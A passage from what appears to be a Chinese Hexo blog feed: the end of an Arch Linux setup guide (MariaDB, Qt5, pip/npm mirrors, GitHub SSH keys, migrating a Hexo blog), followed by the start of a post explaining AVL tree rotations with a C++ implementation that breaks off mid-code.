<figure class="highlight ebnf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo pacman -S mariadb mariadb-libs mariadb-clients</span><br></code></pre></div></td></tr></table></figure>
<p>安装 <a href="https://www.archlinux.org/packages/?name=mariadb">mariadb</a> 软件包之后，你必须在启动 <code>mariadb.service</code> <strong>之前</strong>运行下面这条命令：</p>
<figure class="highlight gradle"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gradle"># mysql_install_db --user=mysql --basedir=<span class="hljs-regexp">/usr --datadir=/</span>var<span class="hljs-regexp">/lib/my</span>sql<br></code></pre></div></td></tr></table></figure>
<p>用下面这个命令启动数据库级别的安全配置助手，来配置一些必要的<strong>安全选项</strong></p>
<figure class="highlight ebnf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ebnf"><span class="hljs-attribute">mysql_secure_installation</span><br></code></pre></div></td></tr></table></figure>
<p>关于Mariadb10.4身份验证发生的一些变化及其配置，可参考：</p>
<p><a href="https://mariadb.org/authentication-in-mariadb-10-4/">Authentication in MariaDB 10.4 — Understanding the Changes</a><br />
或者<br />
<a href="https://mariadb.com/kb/en/library/set-password/">SET PASSWORD</a></p>
<p>修改 root 密码（身份验证表在 **mysql.global_priv **可以 <code>select *from mysql.global_priv;</code> 查看）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">set password for &#x27;root&#x27;@&#x27;%&#x27; =password(&#x27;xxxxxxxxx&#x27;)<br></code></pre></div></td></tr></table></figure>
<p>如果试图这样做</p>
<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">UPDATE mysql.user SET Password=PASSWORD(&#x27;xxxx&#x27;) WHERE User=&#x27;root&#x27;;<br></code></pre></div></td></tr></table></figure>
<p>那么得到的错误是<br />
<font color=red>ERROR 1348 (HY000): Column ‘Password’ is not updatable</font></p>
<h2 id="qt5"><a class="markdownIt-Anchor" href="#qt5"></a> Qt5</h2>
<p>Wiki : <a href="https://wiki.archlinux.org/index.php/Qt_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">https://wiki.archlinux.org/index.php/Qt_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)</a></p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">sudo pacman -S qt5-base qt5-doc qtcreator<br></code></pre></div></td></tr></table></figure>
<p>反正也可以从官网下载安装包自行安装，不过速度就。。。</p>
<h2 id="pythonnpm换国内源"><a class="markdownIt-Anchor" href="#pythonnpm换国内源"></a> Python,Npm换国内源</h2>
<h3 id="python"><a class="markdownIt-Anchor" href="#python"></a> Python</h3>
<p>修改pip.conf文件，若不存在则新建一个并添加以下内容。<br />
<code>nano ~/.pip/pip.conf</code></p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">[global]<br>index-url = https://pypi.tuna.tsinghua.edu.cn/simple<br></code></pre></div></td></tr></table></figure>
<h3 id="npm"><a class="markdownIt-Anchor" href="#npm"></a> Npm</h3>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">npm config get registry<br>npm config set registry https://registry.npm.taobao.org/<br></code></pre></div></td></tr></table></figure>
<h2 id="github-ssh-key"><a class="markdownIt-Anchor" href="#github-ssh-key"></a> Github SSH Key</h2>
<p>首先检查本机是否存在 SSH keys</p>
<ul>
<li>id_rsa</li>
<li>id_rsa.pub</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">ls ~/.ssh<br>id_rsa  id_rsa.pub<br></code></pre></div></td></tr></table></figure>
<p>接着</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">ssh-keygen -t rsa -C <span class="hljs-string">&quot;my_email@example.com&quot;</span><br><span class="hljs-built_in">eval</span> <span class="hljs-string">&quot;<span class="hljs-subst">$(ssh-agent -s)</span>&quot;</span><br>ssh-add ~/.ssh/id_rsa<br>cat ~/.ssh/id_rsa.pub<br></code></pre></div></td></tr></table></figure>
<p>复制 <code>id_rsa.pub</code> 内容到：<br />
–&gt; <strong><a href="https://github.com/settings/keys">Settings</a></strong> --&gt; <strong>SSH and GPG keys</strong> --&gt; <strong>New SSH key</strong></p>
<p>测试是否成功</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">ssh -T git@github.com<br>    The authenticity of host <span class="hljs-string">&#x27;github.com (13.250.177.223)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">    RSA key fingerprint is SHA256:nThbg6kXUpJWGl7E1IGOCspRomTxdCARLviKw6E5SY8.</span><br><span class="hljs-string">    Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">    Warning: Permanently added &#x27;</span>github.com,13.250.177.223<span class="hljs-string">&#x27; (RSA) to the list of known hosts.</span><br><span class="hljs-string">    Hi josexy! You&#x27;</span>ve successfully authenticated, but GitHub does not provide shell access.<br></code></pre></div></td></tr></table></figure>
<p>如此如此即ok，否则no</p>
<p>配置Git，比如我的这样子</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">git config --global user.name <span class="hljs-string">&quot;josexy&quot;</span><br>git config --global user.email <span class="hljs-string">&quot;josephxrays@163.com&quot;</span><br>git config --global color.ui <span class="hljs-literal">true</span> 	<span class="hljs-comment"># 可选</span><br>git config --global credential.helper store  <span class="hljs-comment"># 可选</span><br></code></pre></div></td></tr></table></figure>
<h2 id="迁移github-page-hexo"><a class="markdownIt-Anchor" href="#迁移github-page-hexo"></a> 迁移Github Page hexo</h2>
<p>假如要在另一台电脑上更新修改hexo搭建的博客，那么就要重新部署hexo。然而我们也可以不必如此，只需简单几步即可。</p>
<p>首先到博客根目录查看哪些文件/文件夹需要复制过去</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">ls -la<br>总用量 216<br>drwxr-xr-x   8 josexy josexy   4096  8月  5 08:18 .<br>drwxr-xr-x   6 josexy josexy   4096  8月  6 13:42 ..<br>-rw-r--r--   1 josexy josexy   2591  7月 21 00:22 _config.yml<br>-rw-r--r--   1 josexy josexy    174  8月  5 08:20 db.json<br>drwxr-xr-x  62 josexy josexy   4096  8月  5 08:19 .deploy_git<br>-rw-r--r--   1 josexy josexy     65  7月 20 10:24 .gitignore<br>drwxr-xr-x 345 josexy josexy  20480  7月 20 20:57 node_modules<br>-rw-r--r--   1 josexy josexy    676  7月 20 20:57 package.json<br>-rw-r--r--   1 josexy josexy 148885  7月 20 20:57 package-lock.json<br>drwxr-xr-x  61 josexy josexy   4096  8月  5 08:18 public<br>drwxr-xr-x   2 josexy josexy   4096  7月 20 10:24 scaffolds<br>drwxr-xr-x   7 josexy josexy   4096  7月 21 11:56 <span class="hljs-built_in">source</span><br>drwxr-xr-x   4 josexy josexy   4096  7月 20 11:39 themes<br></code></pre></div></td></tr></table></figure>
<p>以下表格列出需要和不需要复制到其他主机的文件/文件夹</p>
<table>
<thead>
<tr>
<th>需要</th>
<th>不需要</th>
</tr>
</thead>
<tbody>
<tr>
<td>themes</td>
<td>themes/.git</td>
</tr>
<tr>
<td>source</td>
<td>public</td>
</tr>
<tr>
<td>_config.yml</td>
<td>db.json</td>
</tr>
<tr>
<td>.gitignore</td>
<td>.deploy_git</td>
</tr>
<tr>
<td>package.json</td>
<td>package-lock.json</td>
</tr>
<tr>
<td>scaffolds</td>
<td>node_modules</td>
</tr>
</tbody>
</table>
<p>这样的话，我们就可以把 需要 的文件/文件夹复制过去了，为了能够在另一台主机上使用，还需要安装必要的application</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo pacman -S nodejs<br>sudo pacman -S npm<br>sudo pacman -S git<br>npm config <span class="hljs-built_in">set</span> registry https://registry.npm.taobao.org<br>sudo npm i hexo-cli -g<br></code></pre></div></td></tr></table></figure>
<p><font color=red>接着在该目录下执行 <code>npm install</code> 即可安装hexo所需原来的模块，保存在node_modules。 </font><br />
<em><strong>没有必要 <code>hexo init</code>！没有必要 <code>hexo init</code>！没有必要 <code>hexo init</code>！</strong></em>****</p>
<p>若出现类似</p>
<blockquote>
<p>run <code>npm audit fix</code> to fix them, or <code>npm audit</code> for details</p>
<p>npm WARN babel-eslint@10.0.2 requires a peer of eslint@&gt;= 4.12.1 but none is installed. You must install peer depen<br />
dencies yourself.</p>
</blockquote>
<p>按提示操作即可</p>
<p>如果不想每次都要输入github帐号密码，则需要配置 github ssh key ，方法请参见上文。<br />
然后 <code>hexo g</code>即可生成 public文件夹，<code>hexo s</code>本地运行，<code>hexo d</code>即可部署github</p>
<p>若出现类似<code>Error: ENOSPC: System limit for number of file watchers reached</code>，解决方法：</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> fs.inotify.max_user_watches=524288 | sudo tee -a /etc/sysctl.conf &amp;&amp; sudo sysctl -p<br></code></pre></div></td></tr></table></figure>
<h2 id="参考资料"><a class="markdownIt-Anchor" href="#参考资料"></a> 参考资料</h2>
<ul>
<li><a href="https://wiki.archlinux.org/index.php/Installation_guide_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)#%E5%AE%89%E8%A3%85%E5%90%8E%E7%9A%84%E5%B7%A5%E4%BD%9C">参考Archlinux官网Wiki</a></li>
<li><a href="https://www.viseator.com/2017/05/17/arch_install/">以官方Wiki的方式安装ArchLinux</a></li>
<li><a href="https://blog.fc4soda.moe/posts/arch-linux-config-note/">arch linux 安装配置笔记</a></li>
<li><a href="https://starrycat.me/archlinux-install-gnome-desktop.html">ArchLinux安装GNOME图形桌面环境</a></li>
<li><a href="https://github.com/archlinuxcn/mirrorlist-repo">Arch Linux CN Community repo mirrors list</a></li>
<li><a href="https://help.github.com/en/articles/generating-a-new-ssh-key-and-adding-it-to-the-ssh-agent">Generating a new SSH key and adding it to the ssh-agent</a></li>
<li><a href="https://www.zhihu.com/question/21193762">使用hexo，如果换了电脑怎么更新博客</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/74931620">Arch Linux上安装搜狗输入法</a></li>
<li><a href="https://wiki.archlinux.org/index.php/Parted_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">Parted (简体中文)</a></li>
<li><a href="https://wiki.archlinux.org/index.php/Fcitx5_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">Fcitx5_(简体中文)</a></li>
</ul>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Archlinux</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构-AVL树</title>
    <url>/avl-tree-cpp/</url>
    <content><![CDATA[<p>AVL树是最早被发明的<strong>自平衡二叉查找树</strong>。其查找、插入和删除在<strong>平均</strong>和<strong>最坏</strong>情况下的时间复杂度都是 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>log</mi><mo>⁡</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(\log n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span>。AVL树由<strong>G. M. Adelson-Velsky</strong>和<strong>Evgenii Landis</strong>发明，AVL树的名称取自他们名字中的字母。</p>
<span id="more"></span>
<h3 id="avl树"><a class="markdownIt-Anchor" href="#avl树"></a> AVL树</h3>
<p>在讨论AVL树之前先来看一下这张表</p>
<table>
   <tr>
        <td rowspan="2" align="center">方法</td>
        <td colspan="3" align="center">最坏情况</td>
        <td colspan="3" align="center">平均情况</td>
   </tr>
   <tr>
   <td>查找</td><td>插入</td><td>删除</td><td>查找</td><td>插入</td><td>删除</td></tr>
   <tr>
   <td align="center">有序数组</td>
   <td>logn</td><td>n</td><td>n</td><td>logn</td><td>n</td><td>n</td></tr>
   <tr><td align="center">有序链表</td>
   <td>n</td><td>n</td><td>n</td><td>n</td><td>n</td><td>n</td></tr>
   <tr><td align="center">跳表</td>
   <td>n</td><td>n</td><td>n</td><td>logn</td><td>logn</td><td>logn</td></tr>
   <tr><td align="center">哈希表</td>
   <td>n</td><td>n</td><td>n</td><td>1</td><td>1</td><td>1</td></tr>
   <tr><td align="center">BST</td>
   <td>n</td><td>n</td><td>n</td><td>logn</td><td>logn</td><td>logn</td></tr>
   <tr><td align="center">AVL树</td>
   <td>logn</td><td>logn</td><td>logn</td><td>logn</td><td>logn</td><td>logn</td></tr>
   <tr><td align="center">红黑树</td>
   <td>logn</td><td>logn</td><td>logn</td><td>logn</td><td>logn</td><td>logn</td></tr>
</table>
<p>在最坏情况下二叉查找树的复杂度为 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span>，这种情况下BST出现严重“畸形”，或者退化成单链表。<br />
<img src="/uploads/images/data_structure/avlTree_cpp/01.png" alt="" /></p>
<p>这些情况确实存在，那么如何保证不会出现“一边倒”情况呢？这时AVL树就该登场了。</p>
<p>首先来回顾之前的文章，了解到二叉查找树的性质3：</p>
<blockquote>
<p>一棵二叉树有<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span></span></span></span>个元素，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>n</mi><mo>&gt;</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">n&gt;0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>，它的高度最大为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span></span></span></span>，最小高度为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">⌈</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>n</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">⌉</mo></mrow><annotation encoding="application/x-tex">\lceil log_2(n+1) \rceil</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌈</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mclose">⌉</span></span></span></span>。</p>
</blockquote>
<p>AVL树要做的就是将 高度最大为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span></span></span></span> 的情况尽可能的转化为 最小高度为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">⌈</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>n</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">⌉</mo></mrow><annotation encoding="application/x-tex">\lceil log_2(n+1) \rceil</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌈</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mclose">⌉</span></span></span></span> 。</p>
<p><strong>AVL树也是二叉查找树！！！</strong></p>
<h4 id="特征"><a class="markdownIt-Anchor" href="#特征"></a> 特征</h4>
<ul>
<li>一棵n个元素的AVL树高度为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>log</mi><mo>⁡</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(\log n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span></li>
<li>对一棵n个元素的AVL树，在<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>H</mi><mi>e</mi><mi>i</mi><mi>g</mi><mi>h</mi><mi>t</mi><mo stretchy="false">)</mo><mo>=</mo><mi>O</mi><mo stretchy="false">(</mo><mi>log</mi><mo>⁡</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(Height)=O(\log n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="mord mathdefault">e</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">h</span><span class="mord mathdefault">t</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span> 时间内可以实现查找操作</li>
<li>对一棵n个元素的AVL树插入和删除，时间复杂度为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>log</mi><mo>⁡</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(\log n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span></li>
</ul>
<h4 id="平衡因子bf"><a class="markdownIt-Anchor" href="#平衡因子bf"></a> 平衡因子bf</h4>
<p>AVL树是通过平衡因子来调整二叉查找树结构使其平衡,且AVL树的平衡因子只能是 <strong>1、-1、0</strong>，否则该树不是AVL树<br />
节点<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">x</span></span></span></span>的平衡因子<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>b</mi><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">bf(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">b</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span></span></span></span>=<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">x</span></span></span></span>的左子树高度-<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">x</span></span></span></span>的右子树高度<br />
由于平衡因子bf的限定，使得AVL树变成<strong>严格平衡</strong>二叉查找树</p>
<p><img src="/uploads/images/data_structure/avlTree_cpp/02.png" alt="" /></p>
<h3 id="avl树的旋转"><a class="markdownIt-Anchor" href="#avl树的旋转"></a> AVL树的旋转</h3>
<p>造成二叉查找树的不平衡来自于插入和删除操作，在插入或删除一个节点时有几种不平衡状态，分别为“左左/LL”、“左右/LR”、“右右/RR”、“右左/RL”。AVL树要做的，就是处理这些不平衡结构。<br />
<img src="/uploads/images/data_structure/avlTree_cpp/03.png" alt="" /></p>
<p>插入或删除一个节点后，导致根节点的 <strong>平衡因子=左子树的高度-右子树的高度=2</strong>，结果AVL树失去了平衡</p>
<h4 id="ll"><a class="markdownIt-Anchor" href="#ll"></a> LL</h4>
<p>旋转过程：<br />
将<strong>平衡因子=2</strong>的根节点X的<strong>左节点L</strong>作为旋转后的根节点，同时将L的右孩子调整为X的左孩子。<br />
最后更新各个节点的bf</p>
<p><img src="/uploads/images/data_structure/avlTree_cpp/04.png" alt="" /></p>
<h4 id="rr"><a class="markdownIt-Anchor" href="#rr"></a> RR</h4>
<p>旋转过程：<br />
将<strong>平衡因子=2</strong>的根节点X的<strong>右节点R</strong>作为旋转后的根节点，同时将R的左孩子调整为X的右孩子。<br />
最后更新各个节点的bf</p>
<p><img src="/uploads/images/data_structure/avlTree_cpp/05.png" alt="" /></p>
<h4 id="lr"><a class="markdownIt-Anchor" href="#lr"></a> LR</h4>
<p>LR型旋转需要两次旋转，即先左旋(RR)后右旋(LL)<br />
首先围绕不平衡根节点bf=2的<strong>左孩子</strong>进行左旋，再围绕<strong>根节点</strong>进行右旋</p>
<p><img src="/uploads/images/data_structure/avlTree_cpp/06.png" alt="" /></p>
<h4 id="rl"><a class="markdownIt-Anchor" href="#rl"></a> RL</h4>
<p>RL型旋转也需要两次旋转，即先右旋(LL)后左旋(RR)<br />
首先围绕不平衡根节点bf=2的<strong>右孩子</strong>进行右旋，再围绕<strong>根节点</strong>进行左旋</p>
<p><img src="/uploads/images/data_structure/avlTree_cpp/07.png" alt="" /></p>
<h3 id="c代码"><a class="markdownIt-Anchor" href="#c代码"></a> C++代码</h3>
<p>首先定义一个节点结构体</p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">AVLNodeEntry</span>&#123;</span><br>    <span class="hljs-keyword">int</span> key;<br>    T data;<br>    <span class="hljs-keyword">int</span> height;<br>    AVLNodeEntry *parent;<br>    AVLNodeEntry *left_nodes;<br>    AVLNodeEntry *right_nodes;<br>&#125;;<br></code></pre></div></td></tr></table></figure>
<p>AVL树模板类</p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AVLTree</span> &#123;</span><br><span 